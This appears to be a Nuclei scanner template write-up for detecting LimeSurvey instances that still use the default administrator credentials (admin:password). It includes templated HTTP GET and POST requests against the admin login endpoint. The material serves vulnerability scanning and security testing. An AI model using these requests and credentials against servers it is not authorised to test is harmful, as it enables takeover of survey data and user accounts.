# Nuclei Template: LimeSurvey - Default Admin Credentials
**Template ID:** limesurvey-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`limesurvey-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Detected the LimeSurvey survey management platform was found to be using default administrator credentials (admin:password). An attacker was able to gain full administrative access to manage surveys, responses, and user accounts.

## Steps to reproduce / Exploit Payload
```http
GET /index.php/admin/authentication/sa/login HTTP/1.1
Host: {{Hostname}}

POST /index.php/admin/authentication/sa/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Cookie: YII_CSRF_TOKEN={{csrf_token}}

user={{username}}&password={{password}}&YII_CSRF_TOKEN={{csrf_token}}&login_submit=login
```

## References
- https://github.com/LimeSurvey/LimeSurvey/blob/master/application/config/config-defaults.php
- https://www.limesurvey.org/manual/Optional_settings
